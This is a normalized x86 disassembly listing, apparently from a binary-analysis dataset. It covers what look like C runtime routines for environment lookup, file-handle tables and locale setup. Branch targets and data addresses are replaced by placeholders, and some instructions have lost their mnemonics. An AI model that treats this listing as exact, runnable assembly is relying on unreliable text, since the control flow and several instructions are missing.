cmp [ edi ] ebx
je r-xdata
push ebx
call sub_42d0aa
pop ecx
mov eax esi
pop esi
pop ebx
mov ebx esi
sub ebx edi
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x1 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d196
mov [ ebx + edi ] eax
xor eax eax
push eax
call sub_42d0aa
add esp 0xc
cmp [ ebx + edi ] 0x0
je r-xdata
push [ edi ]
push [ ebp - 0x8 ]
push [ ebx + edi ]
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
add edi 0x4
cmp [ edi ] eax
jne r-xdata
mov ecx [ edi ]
lea edx [ ecx + 0x2 ]
xor ebx ebx
sub_438c23
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi edi
cmp [ edi ] 0x0
je r-xdata
sub esi edi
sar esi 0x2
neg esi
mov ebx [ ebp + 0xc ]
add esi 0x4
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov al [ ebx + eax ]
cmp al 0x3d
je r-xdata
push ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_444ca0
add esp 0xc
test eax eax
jne r-xdata
sub esi edi
sar esi 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_438c77
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi edi
cmp [ edi ] 0x0
je r-xdata
sub esi edi
sar esi 0x2
neg esi
mov ebx [ ebp + 0xc ]
add esi 0x4
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
movzx eax [ eax + ebx * 2 ]
cmp eax 0x3d
je r-xdata
push ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_444aa3
add esp 0xc
test eax eax
jne r-xdata
sub esi edi
sar esi 0x2
jmp r-xdata
test ax ax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_438d06
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
call sub_44cbf0
pop ecx
pop ecx
pop ebp
retn
sub_438d20
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
movsx ax [ eax ]
movzx ecx ax
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
call sub_44cd1b
pop ecx
pop ecx
pop ebp
retn
sub_438d3e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42cfc7
add esp 0xc
pop ebp
retn
sub_438d5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436740
add esp 0xc
pop ebp
retn
sub_438d7a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42cfc7
add esp 0xc
pop ebp
retn
sub_438d98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436740
add esp 0xc
pop ebp
retn
sub_438db6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_438dce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_438dec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_444ca0
add esp 0xc
pop ebp
retn
sub_438e0a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_444aa3
add esp 0xc
pop ebp
retn
sub_438ed7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push 0x30
push 0x40
call sub_42d196
mov edi eax
xor ebx ebx
mov [ ebp - 0x8 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
lea eax [ edi + 0xc00 ]
cmp edi eax
je r-xdata
mov edi ebx
jmp r-xdata
push ebx
call sub_42d0aa
pop ecx
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + 0x20 ]
mov edi eax
push ebx
push 0xfa0
lea eax [ esi - 0x20 ]
push eax
call sub_430c30
or [ esi - 0x8 ] 0xffffffff
mov [ esi ] ebx
lea esi [ esi + 0x30 ]
mov [ esi - 0x2c ] ebx
lea eax [ esi - 0x20 ]
mov [ esi - 0x28 ] 0xa0a0000
mov [ esi - 0x24 ] 0xa
and [ esi - 0x23 ] 0xf8
mov [ esi - 0x22 ] bl
cmp eax edi
jne r-xdata
mov edi [ ebp - 0x8 ]
pop esi
sub_438f51
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push ebx
lea ebx [ esi + 0xc00 ]
push edi
mov edi esi
cmp esi ebx
je r-xdata
push esi
call sub_42d0aa
pop ecx
pop edi
pop ebx
push edi
call [ DeleteCriticalSection@IAT ]
add edi 0x30
cmp edi ebx
jne r-xdata
sub_438f86
push 0x14
push r--data
call sub_40d260
cmp [ ebp + 0x8 ] 0x2000
sbb eax eax
neg eax
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
push 0x7
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] esi
mov edi esi
mov eax [ rw-data ]
call sub_42fef5
push 0x9
pop esi
mov [ eax ] esi
call sub_42fdcf
mov [ ebp - 0x4 ] 0xfffffffe
call sub_439015
jmp r-xdata
cmp [ edi * 4 + rw-data ] esi
jne r-xdata
mov eax esi
call sub_40d2a6
retn
inc edi
jmp r-xdata
call sub_438ed7
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ rw-data ]
add eax 0x40
mov [ rw-data ] eax
push 0xc
pop esi
mov [ ebp - 0x1c ] esi
sub_43901e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_439041
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov ebx esi
and eax 0x3f
sar ebx 0x6
imul ecx eax 0x30
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x4 ] ecx
cmp [ ecx + eax + 0x18 ] 0xffffffff
jne r-xdata
push edi
call sub_429c40
mov edi [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax + 0x18 ] edi
xor eax eax
pop edi
jmp r-xdata
sub esi 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0xfffffff6
sub esi 0x1
je r-xdata
push edi
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push edi
push 0xfffffff4
jmp r-xdata
sub_4390d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4390f8
push 0x1c
push r--data
call sub_40d260
push 0x7
call sub_42f32c
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_439201
mov eax edi
call sub_40d2a6
retn
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
lea ecx [ eax + 0xc00 ]
mov [ ebp - 0x20 ] ecx
mov esi eax
push 0x30
pop eax
call sub_438ed7
mov [ ebx * 4 + rw-data ] eax
test eax eax
je r-xdata
inc ebx
jmp r-xdata
test [ esi + 0x28 ] 0x1
jne r-xdata
add [ rw-data ] 0x40
mov edi ebx
shl edi 0x6
push edi
call sub_43901e
pop ecx
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] 0x1
mov [ ebp - 0x2c ] ebx
cmp ebx 0x80
jge r-xdata
add esi eax
jmp r-xdata
push esi
call [ EnterCriticalSection@IAT ]
test [ esi + 0x28 ] 0x1
je r-xdata
mov [ ebp - 0x24 ] esi
cmp esi ecx
je r-xdata
sub esi [ ebp - 0x28 ]
mov eax esi
cdq
push 0x30
pop ecx
idiv ecx
shl ebx 0x6
lea esi [ ebx + eax ]
mov edx esi
sar edx 0x6
mov ecx esi
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x28 ] 0x1
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x18 ] edi
mov edi esi
jmp r-xdata
push esi
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0x20 ]
push 0x30
pop eax
mov [ ebp - 0x1c ] edi
sub_43920a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
js r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
or eax 0xffffffff
cmp esi [ rw-data ]
jae r-xdata
mov eax esi
mov edi esi
and eax 0x3f
sar edi 0x6
imul ebx eax 0x30
mov eax [ edi * 4 + rw-data ]
test [ ebx + eax + 0x28 ] 0x1
je r-xdata
cmp [ ebx + eax + 0x18 ] 0xffffffff
je r-xdata
call sub_429c40
cmp eax 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ ebx + eax + 0x18 ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub esi eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
push 0xfffffff6
sub esi 0x1
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
sub esi 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_43929b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
mov eax [ eax + ecx + 0x18 ]
pop ebp
retn
sub_439305
push 0x10
push r--data
call sub_40d260
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_40d2a6
retn
call sub_4390f8
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x19 ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push esi
call sub_439041
pop ecx
pop ecx
or bl 0x1
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x28 ] bl
mov eax [ edx * 4 + rw-data ]
mov [ ecx + eax + 0x29 ] 0x0
mov eax [ edx * 4 + rw-data ]
and [ ecx + eax + 0x2d ] 0xfe
mov al 0x1
mov [ ebp - 0x19 ] al
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4393ee
mov eax esi
call sub_42fef5
mov [ eax ] 0x18
call sub_42fee2
and [ eax ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
sub_4393ee
test al al
jne r-xdata
push esi
call sub_4390d5
pop ecx
retn
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_439419
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax ]
mov esp ebp
pop ebp
retn
sub_4394dd
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
sub_439504
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x10 ]
mov esp ebp
pop ebp
retn
sub_43952b
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
add eax 0xa0
mov esp ebp
pop ebp
retn
sub_439554
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_42fa1d
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ec4
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x4 ]
mov esp ebp
pop ebp
retn
sub_439594
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x1c ] ebx
mov ecx [ esi + 0xa8 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] ebx
test ecx ecx
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] ebx
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0x8c ] ebx
xor eax eax
mov [ esi + 0x90 ] ebx
mov [ esi ] r--data
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] r--data
mov [ esi + 0x4 ] 0x1
[ eax ]
push 0x4
push 0x1
call sub_42d196
push ebx
mov [ ebp - 0x28 ] eax
call sub_42d0aa
push 0x2
mov edi 0x180
push edi
call sub_42d196
push ebx
mov [ ebp - 0x1c ] eax
call sub_42d0aa
push 0x1
push edi
call sub_42d196
push ebx
mov [ ebp - 0x20 ] eax
call sub_42d0aa
push 0x1
push edi
call sub_42d196
push ebx
mov [ ebp - 0x24 ] eax
call sub_42d0aa
push 0x1
push 0x101
call sub_42d196
mov edi eax
push ebx
mov [ ebp - 0x30 ] edi
call sub_42d0aa
add esp 0x3c
cmp [ ebp - 0x28 ] ebx
je r-xdata
push eax
push 0x1004
push ecx
lea eax [ ebp - 0x48 ]
push ebx
push eax
call sub_444e8e
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
call sub_42d0aa
push [ ebp - 0x1c ]
call sub_42d0aa
push [ ebp - 0x20 ]
call sub_42d0aa
push [ ebp - 0x24 ]
call sub_42d0aa
xor ebx ebx
add esp 0x10
inc ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
mov eax ebx
mov [ eax + edi ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x8 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax 0x5
ja r-xdata
push ebx
push [ esi + 0x8 ]
movzx eax ax
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x2c ] eax
mov edx 0xff
mov eax [ ebp - 0x20 ]
push edx
add eax 0x81
push eax
push edx
push ecx
push 0x100
push [ esi + 0xa8 ]
push ebx
call sub_43fcef
add esp 0x24
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx 0xff
push ebx
push [ esi + 0x8 ]
add eax 0x81
push ecx
push eax
push ecx
lea eax [ edi + 0x1 ]
push eax
push 0x200
push [ esi + 0xa8 ]
push ebx
call sub_43fcef
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x2c ] 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push [ esi + 0x8 ]
add eax 0x100
push eax
push 0x100
push edi
push 0x1
push ebx
mov [ ebp - 0x38 ] eax
call sub_43ad9c
add esp 0x1c
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov edx [ ebp - 0x1c ]
xor ecx ecx
lea eax [ edx + 0xfe ]
mov [ eax ] cx
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ecx + 0x7f ] bl
sub ecx 0xffffff80
cmp [ ebp - 0x2c ] 0x1
mov [ eax + 0x7f ] bl
mov [ ebp - 0x40 ] ecx
mov [ ecx ] bl
lea ecx [ eax + 0x80 ]
mov [ ebp - 0x34 ] ecx
mov [ ecx ] bl
jle r-xdata
lea ecx [ ebp - 0x11 ]
push 0x3f
pop ecx
lea esi [ edx + 0x200 ]
mov edi edx
[ edi ] [ esi ]
mov edx [ ebp - 0x20 ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
lea esi [ edx + 0x100 ]
mov edi edx
[ edi ] [ esi ]
push 0x1f
pop ecx
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea esi [ eax + 0x100 ]
mov edi eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ ebp - 0x3c ]
mov ecx [ esi + 0x8c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
movzx edx [ ecx - 0x1 ]
movzx eax al
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax ] 0x1
mov [ esi + 0x8c ] eax
mov eax [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x90 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x94 ] eax
mov eax [ ebp - 0x34 ]
mov [ esi + 0x98 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
cmp edx eax
jle r-xdata
push [ ebp - 0x30 ]
call sub_42d0aa
pop ecx
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_42d0aa
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_42d0aa
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_42d0aa
push [ esi + 0x8c ]
call sub_42d0aa
add esp 0x10
mov eax [ ebp - 0x24 ]
movzx esi [ ecx - 0x1 ]
movzx eax al
cmp esi eax
jg r-xdata
mov [ edx + edi ] 0x20
inc edx
movzx eax [ ecx ]
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea edi [ edx + 0x100 ]
lea edi [ edi + esi * 2 ]
mov al [ ecx ]
test al al
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x8000
inc esi
mov [ edi ] ax
lea edi [ edi + 0x2 ]
movzx eax [ ecx ]
cmp esi eax
jle r-xdata
sub_43997e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
push eax
call sub_42d0aa
pop ecx
sub_439a7c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ecx
cmp [ ebx + 0xac ] ecx
jne r-xdata
push 0x50
push 0x1
call sub_42d196
mov esi eax
push 0x0
mov [ ebp - 0x4 ] esi
call sub_42d0aa
add esp 0xc
test esi esi
jne r-xdata
cmp [ ebx + 0xb0 ] ecx
jne r-xdata
push 0x4
push 0x1
call sub_42d196
mov edi eax
push 0x0
mov [ ebp - 0x8 ] edi
call sub_42d0aa
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edi ecx
mov [ ebp - 0x8 ] ecx
mov esi rw-data
jmp r-xdata
cmp [ ebx + 0xac ] 0x0
je r-xdata
push esi
call sub_42d0aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x84 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov esi rw-data
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
push 0x1
call sub_42d196
mov edi eax
push 0x0
mov [ ebp - 0xc ] edi
call sub_42d0aa
add esp 0xc
test edi edi
jne r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov [ edi ] ecx
mov edi [ ebx + 0xac ]
lea eax [ esi + 0xc ]
push eax
push 0x15
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x10
lea eax [ ebp - 0x18 ]
push ecx
push 0x14
push edi
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x14
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x1c
mov [ ebp - 0x10 ] eax
push eax
push 0x18
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x20
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x24
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
push 0x1a
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x29
push eax
push 0x19
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2a
push eax
push 0x54
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2b
push eax
push 0x55
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2c
push eax
push 0x56
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2d
push eax
push 0x57
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2e
push eax
push 0x52
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2f
push eax
push 0x53
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
push 0x15
push edi
push 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x3c
push eax
push 0x14
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x40
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x48
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
add esp 0x14
or eax esi
je r-xdata
push esi
call sub_42d0aa
mov eax [ ebp - 0x8 ]
push eax
call sub_42d0aa
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x84 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov edx [ edx ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
push ebx
call sub_43997e
push ebx
call sub_42d0aa
mov eax [ ebp - 0x8 ]
push eax
call sub_42d0aa
mov eax [ ebp - 0xc ]
push eax
call sub_42d0aa
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ ebx + 0x88 ]
call sub_42d0aa
push [ ebx + 0x7c ]
call sub_42d0aa
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
